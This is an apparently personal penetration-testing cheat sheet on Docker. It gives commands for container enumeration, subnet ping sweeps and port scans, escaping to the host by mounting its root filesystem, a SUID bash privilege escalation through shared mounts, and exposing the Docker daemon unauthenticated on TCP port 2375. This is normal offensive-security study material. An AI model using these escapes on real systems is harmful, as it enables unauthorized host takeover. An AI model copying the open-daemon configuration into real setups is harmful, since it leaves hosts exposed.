---
icon: docker
---

# Docker

<details>

<summary><mark style="color:purple;"><strong><code>Enumeration</code></strong></mark></summary>

* <mark style="color:purple;">**Confirm the presence**</mark> <mark style="color:purple;">**of**</mark> <mark style="color:orange;">**`.dockerenv`**</mark>

{% code title="Check if running as root" overflow="wrap" %}
```sh
cat /proc/self/status
```
{% endcode %}

{% code title="Check SUID/SGID" overflow="wrap" %}
```sh
find / -type f \( -perm -4000 -o -perm -2000 \)
```
{% endcode %}

{% code title="Check processes" overflow="wrap" %}
```sh
ps aux
```
{% endcode %}

{% code title="Check the namespaces" overflow="wrap" %}
```sh
cat /proc/self/ns/
```
{% endcode %}

{% hint style="info" %}
<mark style="color:purple;">When the host's user information does not exist inside the containerâ€™s</mark> <mark style="color:orange;">**`/etc/passwd`**</mark> <mark style="color:purple;">file, file permissions will show numeric IDs instead of human-readable names.</mark>
{% endhint %}

{% hint style="info" %}
<mark style="color:purple;">**If the**</mark>**&#x20;**<mark style="color:orange;">**`socket`**</mark>**&#x20;**<mark style="color:purple;">**is mounted you may be able to use**</mark>**&#x20;**<mark style="color:orange;">**`docker-cli`**</mark><mark style="color:purple;">**:**</mark>

{% code overflow="wrap" %}
```sh
mount | grep docker.sock
```
{% endcode %}

```sh
ls -l /var/run/docker.sock
```
{% endhint %}

{% hint style="info" %}
<mark style="color:red;">**`Understand the Network`**</mark>

<mark style="color:purple;">Docker containers typically run in a private virtual network created by Docker, and the default network uses a subnet in the range</mark> <mark style="color:orange;">**`172.16.0.0/12`**</mark>

{% code title="Check the IPs" overflow="wrap" %}
```sh
ip addr
```
{% endcode %}

{% code title="Check the routing table" overflow="wrap" %}
```sh
cat /proc/net/fib_trie
```
{% endcode %}

{% code title="Always ping sweep the subnets" overflow="wrap" %}
```bash
for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```
{% endcode %}

{% code title="Scan ports" overflow="wrap" %}
```sh
for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port open"; done 2>/dev/null
```
{% endcode %}

{% code title="Use OpenSSL to scan ports" overflow="wrap" %}
```sh
for host in 1 2 3 4; do for port in 21 22 25 80 443 8080; do (echo "172.19.0.$host:$port" && openssl s_client -connect 172.19.0.$host:$port 2>/dev/null | grep CONNECTED) & done; done; wait
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
<mark style="color:red;">**`Check for Mounted File Systems`**</mark>

{% code overflow="wrap" lineNumbers="true" %}
```sh
cat /proc/mounts
mount | grep <directory>
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
<mark style="color:red;">**`Look for vulnerabilities and misconfiguration`**</mark>

```sh
cat /etc/docker/daemon.json
```
{% endhint %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>docker-cli</code></strong></mark></summary>

{% hint style="info" %}
{% code title="List running containers" overflow="wrap" %}
```sh
docker ps
```
{% endcode %}

* <mark style="color:purple;">Check for containers running with elevated privileges (</mark><mark style="color:orange;">**`--privileged`**</mark><mark style="color:purple;">,</mark> <mark style="color:orange;">**`--cap-add`**</mark><mark style="color:purple;">).</mark>
* <mark style="color:purple;">Look for containers that share host namespaces or file systems.</mark>
{% endhint %}

{% code title="Check for docker images" overflow="wrap" %}
```sh
docker images
```
{% endcode %}

{% hint style="info" %}
<mark style="color:purple;">Look for containers running as root or with</mark> <mark style="color:orange;">**`--privileged`**</mark> <mark style="color:purple;">mode:</mark>

```sh
docker inspect
```
{% endhint %}

</details>

<details>

<summary><mark style="color:red;"><strong><code>Escape the container</code></strong></mark></summary>

<mark style="color:purple;">Tools like</mark> <mark style="color:orange;">**`nsenter`**</mark> <mark style="color:purple;">or</mark> <mark style="color:orange;">**`docker-exploit`**</mark> <mark style="color:purple;">can be used to attempt escaping the container.</mark>

{% hint style="info" %}
<mark style="color:purple;">If the user is in the</mark> <mark style="color:orange;">**`docker`**</mark> <mark style="color:purple;">group, attempt to run the following command to mount the host filesystem and gain access to the host:</mark>

{% code overflow="wrap" %}
```sh
docker run -v /:/mnt -it bash bash
```
{% endcode %}
{% endhint %}

{% hint style="info" %}
<mark style="color:red;">**`File Ownership Manipulation via Shared Mounts`**</mark>

* <mark style="color:purple;">Check permissions and ownership when you create a file from host and container:</mark>

{% code lineNumbers="true" %}
```sh
touch from_host
touch from_container
```
{% endcode %}

* <mark style="color:purple;">If the container is miss configured and can creates files as a</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">, and you can access the files created by the host on the container:</mark>&#x20;
  1. <mark style="color:orange;">**`From the host`**</mark><mark style="color:purple;">, copy</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">in to the mounted directory.</mark>
  2. <mark style="color:orange;">**`From the container`**</mark><mark style="color:purple;">, change the ownership and permissions of</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">to</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">.</mark>
  3. <mark style="color:purple;">Execute</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">as</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">.</mark>

{% code overflow="wrap" lineNumbers="true" %}
```bash
cp /bin/bash .
chown root:root bash; chmod 4777 bash
./bash -p
```
{% endcode %}
{% endhint %}

</details>

<details>

<summary><mark style="color:purple;"><strong>Configure</strong></mark><strong> </strong><mark style="color:orange;"><strong><code>Docker</code></strong></mark><strong> </strong><mark style="color:purple;"><strong>to listen on a</strong></mark><strong> </strong><mark style="color:orange;"><strong><code>TCP</code></strong></mark><strong> </strong><mark style="color:purple;"><strong>port</strong></mark></summary>

1. <mark style="color:purple;">Open the Docker service file, typically at</mark> <mark style="color:red;">**`/lib/systemd/system/docker.service`**</mark> <mark style="color:purple;">or</mark> <mark style="color:red;">**`/etc/systemd/system/docker.service`**</mark><mark style="color:purple;">.</mark>
2. <mark style="color:purple;">Change</mark> <mark style="color:orange;">**`ExecStart`**</mark> <mark style="color:purple;">to bind a</mark> <mark style="color:orange;">**`TCP`**</mark> <mark style="color:purple;">address:</mark>

```
ExecStart=/usr/bin/dockerd --host=tcp://0.0.0.0:2375
```

3. <mark style="color:purple;">Reload the daemon and restart</mark> <mark style="color:orange;">**`Docker`**</mark> <mark style="color:purple;">if needed:</mark>

{% code overflow="wrap" lineNumbers="true" %}
```sh
systemctl daemon-reload
systemctl restart docker
```
{% endcode %}

4. <mark style="color:purple;">Connect to it using</mark> <mark style="color:orange;">**`docker-cli`**</mark><mark style="color:purple;">:</mark>

{% code overflow="wrap" lineNumbers="true" %}
```sh
export DOCKER_HOST=tcp://<host_ip>:2375
docker ps
```
{% endcode %}

</details>
